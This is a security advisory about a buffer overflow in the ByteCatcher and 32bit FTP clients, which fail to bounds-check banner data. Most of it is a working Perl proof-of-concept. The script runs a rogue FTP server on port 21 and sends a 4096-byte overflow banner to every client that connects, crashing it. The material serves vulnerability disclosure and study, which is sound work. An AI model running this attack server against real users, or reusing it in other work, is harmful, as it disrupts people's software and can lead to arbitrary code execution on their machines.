source: http://www.securityfocus.com/bid/6762/info

It has been reported that ByteCatcher FTP client may be prone to a buffer overflow condition. This issue is due to the client not implementing bounds checking on banner data copied into local memory buffers.

It may be possible for remote attackers to corrupt sensitive regions of memory with attacker-supplied values, possibly resulting in execution of arbitrary code.

#!/usr/bin/perl
######################################################
#
# Affected systems:
# 32bit FTP Client version p9.49.01
# ByteCatcher FTP Client V1.04b
# Possible many other clients, got this problem to
#
# http://www.infowarfare.dk
#
# Dennis Rand - Matrix@infowarfare.dk
#
# When FTP client connects to this server they will CRASH
# ----------------------------------------------------------
# Disclaimer: this file is intended as proof of concept, and
# is not intended to be used for illegal purposes. I accept
# no responsibility for damage incurred by the use of it.
# ----------------------------------------------------------
#
#
#
#
#######################################################
use IO::Socket;
$port = "21";
$data = "a";
$num = "4096";
$buf .= $data x $num;
$server = IO::Socket::INET->new(LocalPort => $port, Type => SOCK_STREAM, Reuse
=> 1, Listen => 2)
or die "Couldn't create tcp-server.\n";
while ($client = $server->accept()) {
print "Client connected.\n";
print "Attacking...";
print $client "$buf";
print "OK\n";
close($client);
}
